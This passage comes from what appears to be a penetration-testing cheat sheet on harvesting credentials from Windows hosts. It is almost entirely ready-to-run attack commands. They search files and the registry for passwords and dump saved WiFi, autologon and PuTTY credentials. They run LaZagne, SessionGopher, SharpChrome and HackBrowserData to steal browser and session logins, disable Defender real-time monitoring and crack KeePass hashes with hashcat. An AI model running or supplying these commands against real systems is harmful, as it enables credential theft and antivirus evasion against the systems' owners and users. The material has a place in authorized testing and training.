nxc smb 10.10.10.50 -u bob -p password -M wifi
```

***

### Troubleshooting

#### Error: "Access Denied" When Searching Files

**Problem:** Cannot access certain directories

**Cause:** Insufficient permissions

**Solution:**

```powershell
# Add -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Include *.config -ErrorAction SilentlyContinue

# Or escalate privileges first
# See Windows Privilege Escalation techniques
```

#### Error: "Path Too Long" When Searching

**Problem:** Windows path length limit (260 characters)

**Solution:**

```powershell
# Use \\?\ prefix for long paths
Get-ChildItem -Path "\\?\C:\Very\Long\Path\..." -Recurse

# Or use shorter search paths
Get-ChildItem -Path C:\Users -Recurse -Depth 5
```

#### LaZagne Returns No Results

**Problem:** LaZagne doesn't find credentials

**Causes:**

1. Credentials encrypted with current user's DPAPI keys
2. No saved credentials in targeted applications
3. Antivirus blocking execution

**Solutions:**

```cmd
# Run as the user whose credentials you want
runas /user:targetuser lazagne.exe

# Disable AV temporarily
Set-MpPreference -DisableRealtimeMonitoring $true

# Run specific modules
lazagne.exe browsers -v
```

#### Cannot Crack KeePass Database

**Problem:** Hashcat not finding password

**Solutions:**

```bash
# Try multiple wordlists
hashcat -m 13400 keepass.hash rockyou.txt
hashcat -m 13400 keepass.hash custom_wordlist.txt

# Add rules
hashcat -m 13400 keepass.hash rockyou.txt -r best64.rule

# Try mask attack for known patterns
hashcat -m 13400 keepass.hash -a 3 ?u?l?l?l?l?d?d?d?s
```

***

### Quick Reference

#### Essential Search Commands

```cmd
# Findstr searches
findstr /SIM /C:"password" *.txt *.ini *.config *.xml
findstr /SIM /C:"cred" *.txt *.ini *.config *.xml

# Dir searches
dir /S /B C:\*password*.txt
dir /S /B C:\*cred*.xml

# PowerShell searches
Get-ChildItem -Path C:\Users -Recurse -Include *password*,*cred* -File -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.xml -ErrorAction SilentlyContinue | Select-String "password"

# Registry searches
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
```

#### Quick Wins

```powershell
# PowerShell history
gc (Get-PSReadLineOption).HistorySavePath

# Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Saved Windows credentials
cmdkey /list

# WiFi passwords
netsh wlan show profile Corp_WiFi key=clear

# Unattend.xml
Get-ChildItem -Path C:\ -Include unattend.xml -Recurse -ErrorAction SilentlyContinue

# Web.config
Get-ChildItem -Path C:\inetpub -Include web.config -Recurse -ErrorAction SilentlyContinue
```

#### Automated Tools

```cmd
# LaZagne
lazagne.exe all

# SessionGopher
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough

# SharpChrome
.\SharpChrome.exe logins /unprotect

# HackBrowserData
.\HackBrowserData.exe
```

